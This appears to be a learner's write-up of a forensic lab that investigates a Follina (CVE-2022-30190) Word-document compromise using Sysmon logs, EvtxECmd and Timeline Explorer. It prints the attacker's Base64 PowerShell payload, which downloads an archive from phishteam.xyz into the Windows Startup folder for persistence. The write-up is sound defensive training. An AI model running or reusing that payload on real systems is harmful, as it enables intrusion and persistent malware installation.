## Short Note: Preparing Artifacts & Tools

Before investigation, first verify evidence integrity by comparing file hashes. Use PowerShell:

```powershell
cd '.\Desktop\Incident Files\'
ls
Get-FileHash -Algorithm SHA256 .\capture.pcapng
```

Main artifacts:

```text
capture.pcapng
sysmon.evtx
windows.evtx
```

Tools used:

```text
Endpoint logs: EvtxEcmd, Timeline Explorer, SysmonView, Event Viewer
Network logs: Wireshark, Brim
```

### EvtxEcmd + Timeline Explorer

`EvtxEcmd` converts Windows/Sysmon `.evtx` logs into CSV:

```powershell
.\EvtxECmd.exe -f 'C:\Users\user\Desktop\Incident Files\sysmon.evtx' --csv 'C:\Users\user\Desktop\Incident Files' --csvf sysmon.csv
```

Then open `sysmon.csv` in **Timeline Explorer** to filter, search, and analyze events easily.

### SysmonView

`SysmonView` visualizes Sysmon activity. First export Sysmon logs as XML using **Event Viewer**, then import the XML into SysmonView.

It helps correlate events related to a specific process, such as process creation, network connections, file creation, and registry activity.
---
## Short Summary: Tempest Incident

In this part, I investigated a **critical incident** where the user **benimaru** on machine **TEMPEST** was compromised through a malicious Word document:

```text
free_magicules.doc
```

The document was opened by **Microsoft Word** with PID:

```text
496
```

The attack used a malicious domain:

```text
phishteam.xyz
```

Sysmon DNS logs showed it resolved to:

```text
167.71.199.191
```

The document executed a Base64-encoded PowerShell payload:

```text
JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==
```

When decoded, it downloads `update.zip` from the attacker server, extracts it into the Windows **Startup folder**, and deletes the zip file. This gives the attacker persistence.

The vulnerability used was:

```text
CVE-2022-30190 / Follina
```

It is a Microsoft Office/MSDT remote code execution vulnerability.

---

## Useful Commands / Investigation Steps

Parse Sysmon EVTX to CSV:

```powershell
.\EvtxECmd.exe -f "C:\Users\user\Desktop\Incident Files\sysmon.evtx" --csv "C:\Users\user\Desktop\Incident Files" --csvf sysmon.csv
```

Search for the malicious document:

```text
free_magicules.doc
```

Search for Word process activity:

```text
winword.exe
```

Check child processes using:

```text
ParentProcessId = 496
```

Search DNS queries:

```text
Event ID 22
QueryName = phishteam.xyz
```

Decode Base64 in PowerShell:

```powershell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("BASE64_STRING"))
```

---

## What I Learned

I learned how to investigate a malicious Office document using **Sysmon logs**, especially:

```text
Event ID 1  = Process Creation
Event ID 22 = DNS Query
```

The main investigation technique was to follow the process chain:

```text
chrome.exe → winword.exe → malicious command execution
```

I also learned that attackers can use **Follina CVE-2022-30190** to make a Word document execute PowerShell commands, download payloads, and create persistence through the Windows Startup folder.
---

